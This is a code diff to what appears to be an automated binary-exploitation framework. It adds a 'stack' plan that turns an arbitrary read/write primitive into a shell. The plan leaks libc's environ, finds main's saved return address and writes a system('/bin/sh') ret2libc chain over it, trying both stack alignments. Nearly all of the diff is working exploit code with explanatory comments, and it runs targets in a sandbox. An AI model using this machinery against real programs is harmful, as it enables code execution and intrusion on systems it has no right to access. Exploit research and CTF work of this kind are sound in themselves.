@@ -2576,8 +2576,10 @@ def _int_candidates(out: bytes) -> list:
 
 def indexed_write_fsop(exe, workdir, *, write_cell, read_cell, libc_data, leak_slots,
                        scratch: int, scratch_size: int = 0, exit_seqs=(b"q\n",),
-                       marker: bytes = _WWW_MARKER, plans=("setcontext", "system", "cat"),
-                       timeout: float = 14.0, base_argv=(), mem_mb: int = 2048) -> dict:
+                       marker: bytes = _WWW_MARKER,
+                       plans=("setcontext", "system", "cat", "stack"),
+                       timeout: float = 14.0, base_argv=(), mem_mb: int = 2048,
+                       target_bytes: bytes = b"", target_base: int = 0) -> dict:
     """Turn a one-word-at-a-time ARBITRARY WRITE (plus the arbitrary READ that usually comes with
     it) into a spawned shell, with no win function and no `system` in the target's PLT.
 
@@ -2609,6 +2611,17 @@ def indexed_write_fsop(exe, workdir, *, write_cell, read_cell, libc_data, leak_s
                       `scratch_size >= heap.CAT_BLOB_MIN`, and takes the setcontext finish when
                       the libc has one.
 
+      "stack"      -- LAST, and no FILE at all: read libc's `environ` for a stack address, walk
+                      down it for MAIN's saved return address (`rop.saved_return_slots` with
+                      `rop.main_return_images`), and write a `system("/bin/sh")` chain over it.
+                      The only plan that needs nothing of the libc but `environ`, `system` and a
+                      `pop rdi`, so it is what is left when the FILE structs are unreachable --
+                      a program that has closed the stream the other plans forge, or an array too
+                      small to hold a FILE of our own. Needs `target_bytes` to tell a saved return
+                      address from a code pointer in a local, and is tried at BOTH rsp parities
+                      because `system`'s prologue has a `movaps`: measured, one parity segfaults
+                      and the other spawns a shell.
+
     setcontext goes first because `execve` beats `system(" /bin/sh")` on both counts that matter
     here: it needs none of the ~2 KB of stack `system` wants under the pivoted rsp (which lands in
     libc's `.data`), and it does not need the command to survive in a field that is also a
@@ -2629,10 +2642,13 @@ def indexed_write_fsop(exe, workdir, *, write_cell, read_cell, libc_data, leak_s
         return {"ok": False, "reason": "no GOT slot names a symbol the linked libc exports"}
     cat_finish = "setcontext" if _heap.house_of_cat_targets(libc_data, "setcontext") else "system"
     targets = {"setcontext": _heap.setcontext_fsop_targets(libc_data),
+               "stack": rop.environ_stack_targets(libc_data),
                "system": _heap.house_of_apple2_cell_targets(libc_data),
                "cat": _heap.house_of_cat_targets(libc_data, cat_finish)}
     if int(scratch_size or 0) < _heap.CAT_BLOB_MIN:
         targets["cat"] = {}                            # no room for the blob beside the bug
+    if not target_bytes or not rop.exec_range(target_bytes):
+        targets["stack"] = {}                          # no image to test a return site against
     runnable = [k for k in plans if targets.get(k)]
     if not runnable:
         return {"ok": False, "reason": "the linked libc supports no FSOP plan "
@@ -2642,7 +2658,7 @@ def indexed_write_fsop(exe, workdir, *, write_cell, read_cell, libc_data, leak_s
     cmd = sandbox.isolate_prefix(exedir, net=False, rw_binds=[exedir]) + \
         [str(exe)] + [str(a) for a in base_argv]
 
-    def _attempt(plan: str) -> dict:
+    def _attempt(plan: str, align: bool = False) -> dict:
         T = targets[plan]
         try:
             p = subprocess.Popen(cmd, stdin=subprocess.PIPE, stdout=subprocess.PIPE,
@@ -2676,6 +2692,51 @@ def indexed_write_fsop(exe, workdir, *, write_cell, read_cell, libc_data, leak_s
             if not base:
                 return {"ok": False, "reason": "no GOT read resolved a page-aligned libc base "
                                                "(the slot may still be unresolved / lazily bound)"}
+            if plan == "stack":
+                stack = next((v for v in _read(base + T["environ"])
+                              if 0x7F0000000000 < v < 0x800000000000), None)
+                if stack is None:
+                    return {"ok": False, "libc_base": base,
+                            "reason": f"read of {T['environ_name']} ({base + T['environ']:#x}) "
+                                      "disclosed no stack-range pointer"}
+                images, skip = rop.main_return_images(target_bytes, libc_data, base,
+                                                      target_base=target_base)
+                slots = rop.saved_return_slots(lambda a: _read(a, 0.15), stack, images=images,
+                                               skip=skip, limit=6)
+                slot = next((a for a, _v, lbl in slots if lbl == "libc"), None)
+                if slot is None:
+                    return {"ok": False, "libc_base": base, "stack": hex(stack),
+                            "slots": [(hex(a), hex(v), lb) for a, v, lb in slots],
+                            "reason": "no saved return address into libc below environ, so "
+                                      "main's frame was not found (the read primitive may not "
+                                      "reach the stack)"}
+                chain = rop.build_stack_ret2libc(
+                    pop_rdi=base + T["pop_rdi"], binsh=base + T["binsh"],
+                    system=base + T["system"], ret_gadget=(base + T["ret"]) if align else 0)
+                cells = [(slot + 8 * k, w) for k, w in enumerate(chain)]
+                shown = [(hex(a), hex(v)) for a, v in cells]
+                for addr, val in cells:
+                    _op(write_cell(addr, val))
+                    if val not in _read(addr):
+                        return {"ok": False, "libc_base": base, "cells": shown,
+                                "reason": f"cell {addr:#x} := {val:#x} did not read back; the "
+                                          "write primitive does not reach the stack"}
+                for seq in (tuple(exit_seqs) or (b"",)):
+                    out = _op(seq, 0.6) if seq else b""
+                    out += _op(b"echo " + marker + b"\n", 1.2)
+                    if marker in out:
+                        return {"ok": True, "libc_base": base, "fp": slot, "cells": shown,
+                                "fp_name": "main's saved return address",
+                                "exit_seq": seq, "finish": "system", "align": align,
+                                "stack": hex(stack), "slot": hex(slot),
+                                "targets": dict({k: v for k, v in T.items()
+                                                 if k != "environ_name"}, align=align)}
+                    if p.poll() is not None:
+                        break
+                return {"ok": False, "libc_base": base, "cells": shown, "align": align,
+                        "reason": f"the chain landed over main's saved return ({slot:#x}) but no "
+                                  f"trigger spawned a shell (exit {p.poll()!r}); "
+                                  f"rsp parity align={align}"}
             if plan == "cat":
                 kw = {"wfile_jumps": base + T["wfile_jumps"], "plan": T["plan"],
                       "size": _heap.CAT_BLOB_MIN}
@@ -2760,11 +2821,18 @@ def indexed_write_fsop(exe, workdir, *, write_cell, read_cell, libc_data, leak_s
         finally:
             sandbox.kill_quietly(p)
 
-    tried, last = [], None
+    # `stack` is run twice, once per rsp parity: `system`'s prologue has a `movaps` and the
+    # parity depends on where main's frame happens to sit, so one of the two segfaults. They
+    # cannot share a process -- the losing one dies.
+    attempts = []
     for plan in runnable:
-        last = _attempt(plan)
+        attempts += ([("stack", True), ("stack", False)] if plan == "stack" else [(plan, False)])
+
+    tried, last = [], None
+    for plan, align in attempts:
+        last = _attempt(plan, align=align)
         last["plan"] = plan
-        tried.append(plan)
+        tried.append(plan if plan != "stack" else f"stack(align={align})")
         if last.get("ok"):
             break
     last["plans_tried"] = tried
